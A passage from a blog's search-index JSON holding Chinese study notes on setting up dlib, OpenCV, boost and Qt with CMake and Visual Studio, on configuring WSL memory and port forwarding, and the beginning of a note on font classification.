target\uff0c\u56e0\u6b64\u53ef\u4ee5\u50cf\u5176\u5b83 C++ \u5e93\u4e00\u6837\u5c06 dlib \u4f5c\u4e3a\u4e00\u4e2a\u9759\u6001\u6216\u52a8\u6001\u5e93\u5b89\u88c5\u5230\u7cfb\u7edf\u4e0a\u3002</p> <ul> <li> <p>\u4f7f\u7528\u9884\u7f16\u8bd1\u7684\u5e93\u65f6\uff0c\u5fc5\u987b\u4fdd\u8bc1\u9879\u76ee\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u5e93\u90fd\u662f\u540c\u4e00\u4e2a\u7248\u672c\u7684 VisualStudio \u7f16\u8bd1\u51fa\u6765\u7684\u3002</p> <p>\u8bf4\u660e\uff1aMixing Multiple Visual Studio Versions in a Program is Evil</p> </li> </ul> <ul> <li>\u8c03\u7528 dlib \u65f6\u51fa\u73b0 USER_ERROR inconsistent_build_configuration see_dlib_faq_2 \u9519\u8bef\u3002   \u9700\u8981\u5c06 build/dlib/config.h \u6587\u4ef6\u62f7\u8d1d\u5230\u6e90\u7801\u76ee\u5f55 dlib-19.17/dlib \u8fdb\u884c\u8986\u76d6\u3002config.h \u6587\u4ef6\u5185\u6709\u5176\u8bf4\u660e\u3002</li> </ul>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#\u914d\u7f6e-3d_face_reconstruction-\u603b\u7ed3","title":"\u914d\u7f6e 3d_face_reconstruction \u603b\u7ed3","text":"","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#1-opencv","title":"1. OpenCV","text":"<ol> <li> <p>windows \u4e0b\u8f7d\u9884\u7f16\u8bd1\u7248 (\u53ea\u542b\u6709 msvc \u7f16\u8bd1\u7684\u7248\u672c)</p> </li> <li> <p>CMake \u76f4\u63a5\u4f7f\u7528 find_packages \u5373\u53ef\u3002\uff08\u9700\u6dfb\u52a0\u73af\u5883\u53d8\u91cf\uff0c\u4ee5\u4fbf\u627e\u5230 OpenCV \u7684 config \u6587\u4ef6\uff09</p> </li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#2-dlib","title":"2. dlib","text":"<ol> <li> <p>\u5b98\u65b9\u63a8\u8350\u5c06\u4ee3\u7801\u76f4\u63a5\u5305\u542b\u5230\u9879\u76ee\u4e2d\u7f16\u8bd1\uff08\u597d\u5904\u662f\u6ca1\u6709 ABI \u4e00\u81f4\u6027\u95ee\u9898\uff09</p> <p>CMake \u4e2d add_subdirectory(/path/to/dlib/top/dir) \u5373\u53ef\u3002\uff08\u751a\u81f3\u53ef\u4ee5\u81ea\u52a8\u4ece\u7f51\u4e0a\u4e0b\u8f7d\uff09</p> </li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#3-boost","title":"3. boost","text":"<ol> <li>\u5206\u4e3a\u53ea\u542b\u6709\u5934\u6587\u4ef6\u7684\u5e93\u548c\u9700\u8981\u72ec\u7acb\u7f16\u8bd1\u7684\u5e93\u3002</li> <li>\u5b98\u65b9\u7f16\u8bd1\u65b9\u6cd5\u4e3a\uff1a<ol> <li>\u5148 build \u51fa Boost.Build\uff08\u53ef\u4ee5\u770b\u4f5c Boost \u7684\u4e00\u4e2a build \u5de5\u5177\uff09</li> <li>\u7136\u540e\u8c03\u7528 b2 \u7f16\u8bd1\u6307\u5b9a\u6a21\u5757\u3002\uff08\u53ef\u4ee5\u6dfb\u52a0\u53c2\u6570\u6307\u5b9a\u7f16\u8bd1\u7684\u5e93\u7684\u8def\u5f84\uff09</li> <li>\u6211\u7684\u7f16\u8bd1\u76ee\u5f55\u662f stage/\uff08\u5e93\u4f4d\u4e8e stage/lib/\u4e0b\uff09</li> </ol> </li> <li>CMake find_packages \u6682\u65f6\u662f\u5931\u8d25\u7684\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#4-eos","title":"4. eos","text":"<ol> <li>\u53ea\u9700\u8981\u5305\u542b\u5934\u6587\u4ef6\u5373\u53ef (header only)\uff0cinclude \u548c 3rdparty</li> <li>\u9876\u5c42\u76ee\u5f55\u4e0b\u7684 CMakeLists.txt \u9ed8\u8ba4\u52fe\u9009\u4e86\u7f16\u8bd1 example \u4e0b\u7684\u793a\u4f8b\uff08\u9700\u8981 boost \u7684 system, filesystem, program_options \u548c openCV \u7684 core, higui, imgproc</li> <li>CMake \u76f4\u63a5 add_subdirectory(/path/to/eos) \u6bd4\u8f83\u65b9\u4fbf\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#5-qt","title":"5. Qt","text":"<ol> <li>\u5b98\u65b9\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528 CMake find_packages\uff0c\u81ea\u52a8 tic, moc \u7b49\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#todo","title":"TODO","text":"<ol> <li>\u5b66\u4e60 Qt\uff0c\u80fd\u81ea\u5df1\u5199\u754c\u9762\u3002</li> <li>\u660e\u767d eos \u90a3\u4e2a\u793a\u4f8b\u7a0b\u5e8f\u8f93\u5165\u8f93\u51fa\u662f\u4ec0\u4e48</li> <li>\u6700\u540e\uff0c\u81ea\u5df1\u6765\u6539\u5199 eos \u7684\u7a0b\u5e8f\uff0c\u81ea\u5df1\u5199 Qt \u7a0b\u5e8f\uff0c\u6700\u540e\u5c55\u793a\u51fa\u6765\u3002</li> </ol>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/","title":"\u5b89\u88c5\u4f7f\u7528 OpenCV(windows)","text":"","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#install","title":"Install","text":"","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u5b89\u88c5\u9884\u7f16\u8bd1\u7248","title":"\u5b89\u88c5\u9884\u7f16\u8bd1\u7248","text":"<p>\u5728opencv.org\u4e0a\u63d0\u4f9b\u4e86\u6e90\u4ee3\u7801\u4ee5\u53ca\u5404\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u9884\u7f16\u8bd1\u7248\u3002windows \u9884\u7f16\u8bd1\u7248\u4e3a\u4e00\u4e2a installer \u7a0b\u5e8f\uff0c\u8fd0\u884c\u540e\u4f1a\u5c06\u5404\u79cd\u6587\u4ef6 extract \u5230\u5b89\u88c5\u76ee\u5f55\u3002\u5b89\u88c5\u5b8c\u6210\u540e\uff0c<code>/path/to/opencv/</code>\u5305\u542b\u4e24\u4e2a\u76ee\u5f55\u2014\u2014build, source\u3002source \u4e3a\u6e90\u4ee3\u7801\u76ee\u5f55 (\u548c\u76f4\u63a5\u4e0b\u8f7d\u6e90\u4ee3\u7801\u89e3\u538b\u4e00\u6a21\u4e00\u6837)\uff0cbuild \u4e0b\u5305\u542b\u4e86\u8bb8\u591a\u5176\u5b83\u6587\u4ef6\u3002\u5176\u4e2d\uff1a</p> <ul> <li>include/\u4e3a\u8c03\u7528 OpenCV \u65f6\u9700\u8981\u5305\u542b\u7684\u5934\u6587\u4ef6 (\u6e90\u4ee3\u7801\u76ee\u5f55\u4e0b\u4e5f\u6709)</li> </ul> <ul> <li> <p>x64/vcxx/\u4e0b\u5305\u542b bin/\u548c lib/\uff0c\u4e3a\u9884\u7f16\u8bd1\u7684\u5e93\u3002vcxx \u4ee3\u8868\u4f7f\u7528 MSVC xx \u7f16\u8bd1\u7684\uff0c\u8fd0\u884c\u65f6\u9700\u8981\u5bf9\u5e94\u7684 runtime \u5e93\u3002</p> IDE \u7f16\u8bd1\u5668 VS2017 VC15 VS2015 VC14 VS2013 VC12 VS2012 VC11 VS2010 VC10 VS2008 VC9 VS2005 VC8 </li> </ul> <ul> <li>etc/\u6587\u4ef6\u5939\u4e2d\u662f OpenCV \u67d0\u4e9b\u7b97\u6cd5\u6240\u4f9d\u8d56\u7684\u6570\u636e\u96c6\u3002</li> </ul> <ul> <li><code>OpenCVConfig.cmake</code>\u6587\u4ef6\u5728\u4f7f\u7528 CMake \u7f16\u8bd1\u9879\u76ee\u65f6\u53ef\u4f7f\u7528 find_package \u81ea\u52a8\u641c\u7d22\u5934\u6587\u4ef6\u3001\u5e93\u6587\u4ef6\u8def\u5f84</li> </ul> <ul> <li>\u5176\u5b83\u6587\u4ef6\u6682\u65f6\u4e0d\u7ba1</li> </ul>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u4ece\u6e90\u6587\u4ef6\u7f16\u8bd1-opencv","title":"\u4ece\u6e90\u6587\u4ef6\u7f16\u8bd1 OpenCV","text":"<p>\u7565</p>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#usage","title":"Usage","text":"","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u901a\u8fc7-visualstudio-\u7f16\u8bd1-opencv-\u7a0b\u5e8f","title":"\u901a\u8fc7 VisualStudio \u7f16\u8bd1 OpenCV \u7a0b\u5e8f","text":"<ol> <li> <p>\u83dc\u5355\u680f project-&gt;properities\u3002\uff08\u6216\u5728\u53f3\u4fa7\u7684 Solution Explorer \u4e0b\u627e\u5230\u4e00\u4e2a project(solution \u548c project \u7684\u5173\u7cfb)\u3002\u9f20\u6807\u53f3\u952e-&gt;Properities\uff09</p> </li> <li> <p>C/C++/AdditionalIncludeDirectories\u3002\u7f16\u8bd1\u5668\u4ece\u8be5\u6587\u4ef6\u5939\u4e0b\u67e5\u627e\u5934\u6587\u4ef6\u3002</p> <p>(p.s. <code>#include \"opencv2/opencv.hpp\"</code>\u548c<code>#include \"opencv.hpp\"</code>\u5bf9\u5e94\u4e0d\u540c\u7684\u8bbe\u7f6e)</p> </li> <li> <p>Linker/Input/AdditionalDependencies \u6dfb\u52a0<code>opencv_world420.lib</code></p> </li> <li> <p>Linker/General/AdditionalLibraryDirectories \u6dfb\u52a0<code>opencv_world420.lib</code>\u6240\u5728\u76ee\u5f55\u3002\uff08\u6216\u76f4\u63a5\u5728 3 \u4e2d\u8f93\u5165\u7edd\u5bf9\u8def\u5f84\uff09</p> </li> <li> <p>\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u628a<code>opencv_world420.dll</code>\u6240\u5728\u76ee\u5f55\u6dfb\u52a0\u5230 Path \u53d8\u91cf\u3002(\u5426\u5219\u8fd0\u884c\u65f6\u62a5\u9519\uff1a\u65e0\u6cd5\u627e\u5230<code>opencv_world420.dll</code>)\u3002\u4e0d\u6dfb\u52a0\u73af\u5883\u53d8\u91cf\u7684\u65b9\u6cd5\u662f\u76f4\u63a5\u628a<code>opencv_world420.dll</code>\u62f7\u8d1d\u5230 exe \u6240\u5728\u76ee\u5f55\u3002</p> <p>p.s. \u8c8c\u4f3c<code>opencv_world420.lib</code>\u8868\u9762\u4e0a\u662f\u4e00\u4e2a\u9759\u6001\u94fe\u63a5\u5e93\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u56e0\u800c\u8fd0\u884c\u65f6\u9700\u8981<code>opencv_world420.dll</code>\u3002\u800c\u7b2c 3 \u6b65\u5982\u82e5\u6539\u6210\u6dfb\u52a0<code>opencv_world420.dll</code>\uff0c\u5219\u7f16\u8bd1\u5931\u8d25\u3002</p> <p>LNK1107 could also occur if you attempt to pass a module (.dll or .netmodule extension created with /clr:noAssembly or /NOASSEMBLY) to the linker; pass the .obj file instead.</p> </li> </ol>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u901a\u8fc7-cmake-\u7f16\u8bd1-opencv-\u7a0b\u5e8f","title":"\u901a\u8fc7 CMake \u7f16\u8bd1 OpenCV \u7a0b\u5e8f","text":"<p>\u53c2\u8003\uff1aUsing OpenCV with gcc and CMake</p> <p>\u901a\u8fc7 CMake \u7f16\u8bd1 OpenCV \u7a0b\u5e8f\u6709\u51e0\u70b9\u597d\u5904\uff1a</p> <ul> <li>\u5728 Windows \u548c Linux \u4e4b\u95f4\u79fb\u690d\u7a0b\u5e8f\u4e0d\u7528\u66f4\u6539\u8bbe\u7f6e\u3002</li> </ul> <ul> <li>\u81ea\u52a8\u641c\u7d22 include\uff0clib \u8def\u5f84\u3002(\u901a\u8fc7<code>OpenCVConfig.cmake</code>\u6587\u4ef6\uff0c\u9700\u6dfb\u52a0\u5230 Path \u73af\u5883\u53d8\u91cf)</li> <li>\u5199\u4ee3\u7801\u7684\u65b9\u5f0f\u6bd4 VisualStudio \u70b9\u51fb\u6309\u94ae\u7136\u540e\u8f93\u5165\u65b9\u4fbf\uff0c\u914d\u7f6e\u7684\u6587\u4ef6\u53ef\u4ee5\u4fdd\u7559\u4e0b\u6765\u7528\u4e8e\u5176\u5b83\u9879\u76ee\u3002</li> </ul> <p>\u7f3a\u70b9\uff1a</p> <ul> <li> </li> </ul> <p>\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u6dfb\u52a0<code>opencv/build/</code>\u5230 Path(<code>OpenCVConfig.cmake</code>\u6240\u5728\u76ee\u5f55)\u3002</p> </li> <li> <p>\u7f16\u5199<code>CMakeLists.txt</code>\u3002\u793a\u4f8b\uff1a</p> <pre><code>cmake_minimum_required(VERSION 2.8)\nproject( DisplayImage )\nfind_package( OpenCV REQUIRED ) //\nadd_executable( DisplayImage DisplayImage.cpp )\ntarget_link_libraries( DisplayImage ${OpenCV_LIBS} ) //\n</code></pre> </li> <li> <p>\u4f7f\u7528 CMake GUI\uff0c\u70b9\u51fb configure(\u53ef\u4ee5\u5148 File-&gt;Delete Cache\uff0c\u5220\u9664\u6389\u4e4b\u524d\u7684\u914d\u7f6e)</p> <p>\u9009\u62e9 VS \u7684\u7f16\u8bd1\u5668\u3002</p> </li> <li> <p>\u5728\u4e2d\u95f4\u9762\u677f\u4fee\u6539\u4e00\u4e9b\u53d8\u91cf\u7684\u503c\u3002\uff08\u91cd\u65b0 configure\uff09</p> </li> <li> <p>Generate\uff0c\u5728 build \u76ee\u5f55\u4e0b\u751f\u6210 VS \u7684 sln \u6587\u4ef6\uff0c\u53cc\u51fb\u6253\u5f00\u3002</p> </li> <li> <p>\u5728 ALL_BUILD \u4e0a\u53f3\u952e build\u3002</p> </li> </ol>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#include-\u67d0\u4e2a\u6587\u4ef6vs-code-\u4e0d\u4f1a\u81ea\u52a8\u63d0\u793a\u4e0d\u4f1a\u81ea\u52a8\u81ea\u52a8\u8865\u5168\u51fd\u6570\u4e0d\u4f1a\u663e\u793a\u51fd\u6570\u6587\u6863","title":"include \u67d0\u4e2a\u6587\u4ef6\uff0cVS Code \u4e0d\u4f1a\u81ea\u52a8\u63d0\u793a\uff0c\u4e0d\u4f1a\u81ea\u52a8\u81ea\u52a8\u8865\u5168\u51fd\u6570\uff0c\u4e0d\u4f1a\u663e\u793a\u51fd\u6570\u6587\u6863","text":"<p>\uff08\u53ef\u4ee5\u5148\u7528 CMake \u914d\u7f6e\u597d include, lib \u540e\uff0c\u751f\u6210 sln \u5e76\u7528 VS \u6253\u5f00\uff09</p>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/","title":"WSL \u8bb0\u5f55","text":"","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u53d1\u73b0\u4f7f\u7528 wsl + docker + vs code(remote wsl + remote container \u63d2\u4ef6) \u53ef\u4ee5\u8ba9\u5f00\u53d1\u3001\u90e8\u7f72\u3001\u8fd0\u884c\u6574\u4e2a\u6d41\u7a0b\u53d8\u5f97\u66f4\u52a0\u65b9\u4fbf\u3002\u56e0\u6b64\u60f3\u5199\u4e00\u7bc7\u6587\u7ae0\u8bb0\u5f55\u63a5\u89e6 wsl \u540e\u4e86\u89e3\u5230\u7684\u4e00\u4e9b\u77e5\u8bc6\u4ee5\u53ca\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\u4ee5\u53ca\u89e3\u51b3\u65b9\u6848\uff08\u957f\u671f\u66f4\u65b0\uff09\u3002</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#wsl1-\u539f\u7406","title":"WSL1 \u539f\u7406","text":"<p>\u5fae\u8f6f\u5b98\u65b9 wsl \u535a\u5ba2\u4e2d\u6709\u4e00\u4e2a\u7cfb\u5217\u6587\u7ae0\u4ecb\u7ecd wsl1 \u7684\u539f\u7406\uff0c\u5728\u9605\u8bfb\u5176\u4e2d\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u5185\u5bb9\u540e\u53d1\u73b0\u6ca1\u6709\u60f3\u8c61\u4e2d\u7684\u96be\u61c2\uff0c\u53cd\u800c\u5b66\u5230\u4e86\u8bb8\u591a\u77e5\u8bc6\uff0c\u56e0\u6b64\u628a\u5b83\u8bb0\u5f55\u4e0b\u6765\u3002</p> <p>\u7cfb\u5217\u535a\u5ba2</p> <ol> <li>Windows Subsystem for Linux Overview</li> <li>Pico Process Overview</li> <li>WSL system Calls</li> <li>WSL File System Support</li> <li>\u5176\u5b83</li> </ol>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u8bbe\u7f6e-wsl-\u5185\u5b58\u4e0e-cpu-\u8d44\u6e90","title":"\u8bbe\u7f6e wsl \u5185\u5b58\u4e0e cpu \u8d44\u6e90","text":"<p>\u7f16\u8f91<code>C:\\Users\\&lt;yourUserName&gt;\\.wslconfig</code>\u5185\u5bb9</p> <pre><code>[wsl2]\nkernel=C:\\\\temp\\\\myCustomKernel\nmemory=4GB # Limits VM memory in WSL 2 to 4 GB\nprocessors=2 # Makes the WSL 2 VM use two virtual processors\n</code></pre> <p>\u5176\u5b83\u8d44\u6e90\u8bbe\u7f6e\u53c2\u8003[1]</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u8bbf\u95ee\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f","title":"\u8bbf\u95ee\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f","text":"","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u4ece-windows-localhost-\u8bbf\u95ee-linux-\u7f51\u7edc\u5e94\u7528","title":"\u4ece Windows (localhost) \u8bbf\u95ee Linux \u7f51\u7edc\u5e94\u7528","text":"<p>\u76f4\u63a5\u901a\u8fc7 localhost \u8bbf\u95ee\uff08\u6ce8\u610f\uff0c\u901a\u8fc7 127.0.0.1 \u8bbf\u95ee\u4f1a\u5931\u8d25\uff09</p> <p>\u5982\u679c\u8fd0\u884c\u7684\u662f\u8f83\u65e7\u7248\u672c\u7684 Windows\uff08\u7248\u672c 18945 \u6216\u66f4\u4f4e\u7248\u672c\uff09\uff0c\u5219\u9700\u8981\u83b7\u53d6 Linux \u4e3b\u673a VM \u7684 IP \u5730\u5740</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u4ece-linux\u4e3b\u673a-ip\u8bbf\u95ee-windows-\u7f51\u7edc\u5e94\u7528","title":"\u4ece Linux\uff08\u4e3b\u673a IP\uff09\u8bbf\u95ee Windows \u7f51\u7edc\u5e94\u7528","text":"<p>\u5982\u8bbe\u7f6e git \u4f7f\u7528 windows \u7684 socks \u4ee3\u7406\u3002</p> <pre><code>\u279c  ~ cat /etc/resolv.conf\n# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:\n# [network]\n# generateResolvConf = false\nnameserver 172.31.144.1\n</code></pre> <p>\u4f7f\u7528\u8be5 ip \u8bbf\u95ee windows \u7f51\u7edc\u5e94\u7528\uff08\u6ce8\u610f\uff0c\u6bcf\u6b21\u542f\u52a8 wsl \u8be5 ip \u4f1a\u53d8\u5316\uff0c\u76ee\u524d\u8fd8\u6ca1\u627e\u5230\u89e3\u51b3\u65b9\u5f0f\uff09</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u4ece\u5c40\u57df\u7f51-lan-\u8bbf\u95ee-wsl-2-\u5206\u53d1\u7248","title":"\u4ece\u5c40\u57df\u7f51 (LAN) \u8bbf\u95ee WSL 2 \u5206\u53d1\u7248","text":"<p>\u4f7f\u7528 wsl1 \u65f6\uff0cwsl \u4e0e\u4e3b\u673a\u5171\u7528 ip\uff0c\u56e0\u6b64\u5982\u679c\u8ba1\u7b97\u673a\u8bbe\u7f6e\u4e3a\u53ef\u4f9b LAN \u8bbf\u95ee\uff0c\u90a3\u4e48\u5728 WSL \u4e2d\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u4e5f\u53ef\u4f9b\u5728 LAN \u4e2d\u8bbf\u95ee\u3002</p> <p>\u4f7f\u7528 wsl2 \u65f6\uff0cwsl \u6709\u4e00\u4e2a\u5e26\u6709\u5176\u81ea\u5df1\u72ec\u4e00\u65e0\u4e8c\u7684 IP \u5730\u5740\u7684\u865a\u62df\u4ee5\u592a\u7f51\u9002\u914d\u5668\uff08\u548c\u4e3b\u673a\u6240\u5728\u7684\u7f51\u6bb5\u4e0d\u4e00\u6837\uff0c\u5982\uff1a\u4e3b\u673a\u8fde\u63a5\u7684\u8def\u7531\u5668\u7684\u7f51\u6bb5\u4e3a 192.168.1.0/24\uff0c\u800c wsl \u6240\u5728\u7684\u7f51\u6bb5\u4e3a 172.31.144.0/20\uff0cwsl \u4e0a\u7f51\u9700\u8981\u7ecf\u8fc7\u4e3b\u673a\u8fdb\u884c NAT \u8f6c\u6362\uff09\uff0c\u56e0\u6b64\u9700\u8981\u6267\u884c\u4e0e\u5e38\u89c4\u865a\u62df\u673a\u76f8\u540c\u7684\u6b65\u9aa4\uff08\u7aef\u53e3\u8f6c\u53d1\uff09\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b PowerShell \u547d\u4ee4\uff0c\u7528\u4e8e\u6dfb\u52a0\u4fa6\u542c\u4e3b\u673a\u4e0a\u7684\u7aef\u53e3 4000 \u7684\u7aef\u53e3\u4ee3\u7406\u5e76\u5c06\u5176\u8fde\u63a5\u5230\u7aef\u53e3 4000\uff0c\u5e76\u4f7f\u7528 IP \u5730\u5740 172.31.157.77\uff08WSL \u7684 ip \u5730\u5740\uff09\u8fde\u63a5\u5230 WSL 2 VM\u3002</p> <pre><code>netsh interface portproxy add v4tov4 listenport=4000 listenaddress=0.0.0.0 connectport=4000 connectaddress=172.31.157.77\n</code></pre> <p>\u5176\u5b83\u53c2\u8003[2]</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ol> <li> <p>microsoft doc: wsl-config</p> </li> <li> <p>microsoft doc: wsl1/2 compare</p> </li> </ol>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/","title":"\u5b57\u4f53\u5206\u7c7b","text":"<ul> <li>\u6982\u8ff0<ul> <li>font family</li> <li>font style</li> <li>font weight</li> <li>font size</li> </ul> </li> <li>css \u4e2d\u8bbe\u7f6e\u5b57\u4f53<ul> <li>font-*\u5c5e\u6027</li> <li>font \u5c5e\u6027</li> </ul> </li> <li>LaTex \u4e2d\u8bbe\u7f6e\u5b57\u4f53<ul> <li>Font size, style, family</li> <li>Underlined, emphasising</li> <li>Supporting modern fonts with XeLaTeX</li> </ul> </li> <li>\u53c2\u8003\u6587\u732e</li> </ul>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u76ee\u524d\u8fd8\u6ca1\u6709\u4e00\u79cd\u7edf\u4e00\u7684\u5b57\u4f53\u5206\u7c7b\u65b9\u6cd5\u3002\u56e0\u6b64\u672c\u6587\u4ece\u6613\u4e8e\u7406\u89e3\u7684\u89d2\u5ea6\uff0c\u4f7f\u7528 4 \u4e2a\u7ef4\u5ea6\u5bf9\u5b57\u4f53\u8fdb\u884c\u5206\u7c7b\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u786e\u5b9a\u4e86\u5927\u5c0f\u3001\u7c97\u7ec6\u3001\u6837\u5f0f\u548c\u5b57\u4f53\u7cfb\u5217\u540e\u4fbf\u786e\u5b9a\u4e86\u4e00\u79cd\u5b57\u4f53\u3002</p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-family","title":"font family","text":"<p>\u5b57\u4f53\u7cfb\u5217(font family) \u8868\u793a\u7b26\u5408\u540c\u4e00\u79cd\u8bbe\u8ba1\u98ce\u683c\u7684\u5b57\u4f53\u7684\u96c6\u5408\u3002\u6bd4\u5982\u5927\u540d\u9f0e\u9f0e\u7684 Helvetica \u5b57\u4f53\u5c31\u56e0\u9192\u76ee\uff0c\u6e05\u6670\u800c\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5e7f\u544a\uff0c\u5ba3\u4f20\u8bed\u7b49\u573a\u5408\u3002Time New Roman \u4e5f\u662f\u4e00\u79cd\u4f7f\u7528\u975e\u5e38\u5e7f\u6cdb\u7684\u5b57\u4f53\u3002</p> <p>\u4e00\u79cd\u5b57\u4f53\u7cfb\u5217\u5305\u542b\u591a\u79cd\u53d8\u4f53\u5b57\u4f53\uff0c\u5982 Times \u5305\u542b TimeIt(\u503e\u659c), TimeBd(\u52a0\u7c97) \u7b49\u3002\u6211\u4eec\u53e3\u8bed\u4e2d\u8bf4\u7684\u67d0\u4e00\u79cd\u5b57\u4f53\uff0c\u5176\u5b9e\u901a\u5e38\u8bf4\u7684\u662f\u4e00\u79cd\u5b57\u4f53\u7cfb\u5217\u3002</p> <p>\u800c\u5bf9\u4e8e\u73b0\u6709\u7684\u4e94\u82b1\u516b\u95e8\u7684\u5b57\u4f53\u7cfb\u5217\uff0c\u53ef\u4ee5\u6839\u636e\u4e00\u4e9b\u7279\u70b9\u5206\u6210 5 \u7c7b\uff0c\u4e5f\u53eb\u901a\u7528\u5b57\u4f53\u7cfb\u5217(generic font families)\u3002\u5982 Helvetica \u5c31\u5c5e\u4e8e\u65e0\u886c\u7ebf (sans serif) \u5b57\u4f53\u3002</p> <p>\u4ee5\u4e0b\u662f\u5b57\u4f53\u7cfb\u5217\u7684 5 \u79cd\u7c7b\u522b</p> <ul> <li> <p>Serif 